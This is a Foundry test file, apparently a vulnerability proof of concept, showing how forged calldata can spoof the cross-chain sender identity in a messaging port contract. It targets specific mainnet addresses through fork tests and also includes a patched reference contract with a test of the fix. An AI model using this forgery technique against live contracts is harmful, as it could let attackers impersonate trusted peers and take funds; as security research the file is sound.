// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Interfaces.sol";
import "../src/Helpers.sol";

contract XmsgSenderForgeTest is Test {

    // ── CONFIRMED VALUES FROM ETHERSCAN ──────────────────────────────────────
    address constant TARGET_PORT   = 0x2cd1867fb8016f93710b6386f7f9f1d540a60812;
    address constant TARGET_MESSAGER = 0x02e5c0a36fb0c83ccebcd4d6177a7e223d6f0b7c;
    address constant ORMP_RELAY    = 0x13b2211a7cA45Db2808F6dB05557ce5347e3634e;
    uint256 constant FROM_CHAIN_ID = 42161; // Arbitrum — only active peer
    address constant FORGED_PEER   = 0x2cd1867Fb8016f93710B6386f7f9F1D540A60812;

    // ── STATE ─────────────────────────────────────────────────────────────────
    SenderCapture  public capture;
    SenderReporter public reporter;
    address public attackerEOA;

    // ── SETUP ─────────────────────────────────────────────────────────────────
    function setUp() public {
        capture     = new SenderCapture();
        reporter    = new SenderReporter();
        attackerEOA = makeAddr("attacker");

        vm.label(TARGET_PORT,      "ORMPUpgradeablePort");
        vm.label(TARGET_MESSAGER,  "MsgportMessager");
        vm.label(ORMP_RELAY,       "ORMP_RELAY");
        vm.label(address(capture), "SenderCapture");
        vm.label(attackerEOA,      "Attacker");
        vm.label(FORGED_PEER,      "ForgedPeer(ArbitrumMirror)");
    }

    // ═════════════════════════════════════════════════════════════════════════
    // UNIT TESTS — no fork needed
    // forge test --match-test "testUnit|testFuzz|testPatch" -vvvv
    // ═════════════════════════════════════════════════════════════════════════

    function testUnit_ExtractionMechanism() public {
        address target = address(0xBEEF);

        bytes memory callData = abi.encodeWithSelector(
            SenderReporter.extractSender.selector
        );
        callData = bytes.concat(callData, bytes20(target));

        (bool ok, bytes memory ret) = address(reporter).call(callData);
        assertTrue(ok, "extractSender call failed");

        address extracted = abi.decode(ret, (address));
        assertEq(extracted, target, "VULNERABLE: assembly reads attacker-controlled last 20 bytes");

        console.log("[UNIT] Appended address  :", target);
        console.log("[UNIT] Extracted address :", extracted);
        console.log("[UNIT] Match             : CONFIRMED");
    }

    function testUnit_CalldataLayout() public {
        bytes memory innerMsg = abi.encodePacked(
            bytes12(0),
            FORGED_PEER
        );

        bytes memory callData = abi.encodeWithSelector(
            IORMPPort.recv.selector,
            FROM_CHAIN_ID,
            attackerEOA,
            address(capture),
            innerMsg
        );

        bytes memory last20 = new bytes(20);
        for (uint i = 0; i < 20; i++) {
            last20[i] = callData[callData.length - 20 + i];
        }
        address recoveredFromLayout = address(bytes20(last20));

        assertEq(recoveredFromLayout, FORGED_PEER,
            "LAYOUT CONFIRMED: attacker controls last 20 bytes of recv() calldata");

        console.log("[LAYOUT] Forged peer in message    :", FORGED_PEER);
        console.log("[LAYOUT] Last 20 bytes of calldata :", recoveredFromLayout);
        console.log("[LAYOUT] Full calldata length      :", callData.length);
    }

    function testFuzz_ArbitraryAddress(address fuzzAddr) public {
        vm.assume(fuzzAddr != address(0));

        bytes memory callData = abi.encodeWithSelector(
            SenderReporter.extractSender.selector
        );
        callData = bytes.concat(callData, bytes20(fuzzAddr));

        (bool ok, bytes memory ret) = address(reporter).call(callData);
        assertTrue(ok);

        address extracted = abi.decode(ret, (address));
        assertEq(extracted, fuzzAddr, "Fuzz: extraction failed");
    }

    function testPatch_VerifyFix() public {
        PatchedPort patched = new PatchedPort(address(this));

        bytes memory callData = abi.encodeWithSelector(
            PatchedPort.testXmsgSender.selector
        );
        callData = bytes.concat(callData, bytes20(FORGED_PEER));

        // Trusted endpoint — should extract the appended address
        vm.prank(address(this));
        (bool ok, bytes memory ret) = address(patched).call(callData);
        assertTrue(ok);
        address result = abi.decode(ret, (address));
        assertEq(result, FORGED_PEER, "Trusted: should extract appended sender");
        console.log("[PATCH] Trusted endpoint returned  :", result);

        // Untrusted caller — must NOT extract the appended address
        address untrusted = makeAddr("untrusted");
        vm.prank(untrusted);
        (bool ok2, bytes memory ret2) = address(patched).call(callData);
        assertTrue(ok2);
        address result2 = abi.decode(ret2, (address));
        assertEq(result2, untrusted, "Patched: untrusted gets msg.sender only");
        assertTrue(result2 != FORGED_PEER, "Patched: forgery must be blocked");
        console.log("[PATCH] Untrusted caller returned  :", result2);
        console.log("[PATCH] Forged address             :", FORGED_PEER);
        console.log("[PATCH] Forgery blocked            : CONFIRMED");
    }

    // ═════════════════════════════════════════════════════════════════════════
    // FORK TESTS — requires ETH_RPC_URL
    // forge test --fork-url $ETH_RPC_URL --match-test testForge -vvvv
    // ═════════════════════════════════════════════════════════════════════════

    function testForge_ORMPPort() public {
        console.log("[FORGE] Target port  :", TARGET_PORT);
        console.log("[FORGE] ORMP relay   :", ORMP_RELAY);
        console.log("[FORGE] Forged peer  :", FORGED_PEER);
        console.log("[FORGE] From chainId :", FROM_CHAIN_ID);

        // Craft message: last 20 bytes = FORGED_PEER
        bytes memory craftedMsg = bytes.concat(
            abi.encode(uint256(0xdeadbeef)), // arbitrary payload prefix
            bytes20(FORGED_PEER)             // THE FORGE — last 20 bytes
        );

        bytes memory callData = abi.encodeWithSelector(
            IORMPPort.recv.selector,
            FROM_CHAIN_ID,        // fromChainId = 42161 (Arbitrum)
            attackerEOA,          // fromDapp    (any address)
            address(capture),     // toDapp      (our capture contract)
            craftedMsg            // message     (attacker-controlled)
        );

        // Call as the legitimate ORMP relay — passes onlyORMP
        vm.prank(ORMP_RELAY);
        (bool ok, bytes memory revertData) = TARGET_PORT.call(callData);

        if (!ok) {
            string memory reason = _decodeRevert(revertData);
            console.log("[FORGE] Call REVERTED:", reason);
            console.log("────────────────────────────────────────────");
            console.log("[FORGE] RESULT: Echo's defence may hold.");
            console.log("[FORGE] Relay likely appends a fixed suffix.");
            console.log("[FORGE] Severity: MEDIUM — confirm relay source.");
            console.log("────────────────────────────────────────────");
            return;
        }

        console.log("[FORGE] Call SUCCEEDED via relay");
        console.log("[FORGE] capture.wasCalled    :", capture.wasCalled());

        if (capture.wasCalled()) {
            console.log("────────────────────────────────────────────");
            console.log("[FORGE] *** VULNERABILITY CONFIRMED ***");
            console.log("[FORGE] recv() executed with forged identity.");
            console.log("[FORGE] Severity: HIGH / CRITICAL");
            console.log("[FORGE] Patch recv() entrypoint immediately.");
            console.log("────────────────────────────────────────────");
        } else {
            console.log("[FORGE] Call succeeded but capture not triggered.");
            console.log("[FORGE] Additional guard may exist downstream.");
        }
    }

    function testForge_MsgportMessager() public {
        console.log("[MESSAGER] Target    :", TARGET_MESSAGER);
        console.log("[MESSAGER] Relay     :", ORMP_RELAY);
        console.log("[MESSAGER] Forged ID :", FORGED_PEER);

        bytes memory craftedMsg = bytes.concat(
            abi.encode(uint256(0xdeadbeef)),
            bytes20(FORGED_PEER)
        );

        bytes memory callData = abi.encodeWithSelector(
            IMsgportMessager.receiveMessage.selector,
            FROM_CHAIN_ID,
            attackerEOA,
            craftedMsg
        );

        vm.prank(ORMP_RELAY);
        (bool ok, bytes memory revertData) = TARGET_MESSAGER.call(callData);

        if (!ok) {
            console.log("[MESSAGER] Reverted:", _decodeRevert(revertData));
        } else {
            console.log("[MESSAGER] *** MESSAGER FORGERY SUCCEEDED ***");
            console.log("[MESSAGER] Severity: HIGH / CRITICAL");
        }
    }

    // ── HELPERS ───────────────────────────────────────────────────────────────
    function _decodeRevert(bytes memory data) internal pure returns (string memory) {
        if (data.length < 4) return "no revert data / no error message";
        bytes4 sig = bytes4(data);
        if (sig == 0x08c379a0 && data.length > 4) {
            bytes memory payload = new bytes(data.length - 4);
            for (uint i = 0; i < payload.length; i++) {
                payload[i] = data[i + 4];
            }
            (string memory msg_) = abi.decode(payload, (string));
            return msg_;
        }
        return "custom error (no string)";
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// PatchedPort — reference implementation of the ERC-2771 compliant fix
// ─────────────────────────────────────────────────────────────────────────────
contract PatchedPort {
    address public immutable ORMP_ENDPOINT;

    constructor(address endpoint) {
        ORMP_ENDPOINT = endpoint;
    }

    function _xmsgSender() internal view returns (address payable _from) {
        if (msg.sender == ORMP_ENDPOINT && msg.data.length >= 20) {
            assembly {
                _from := shr(96, calldataload(sub(calldatasize(), 20)))
            }
        } else {
            _from = payable(msg.sender);
        }
    }

    function testXmsgSender() external view returns (address) {
        return _xmsgSender();
    }
}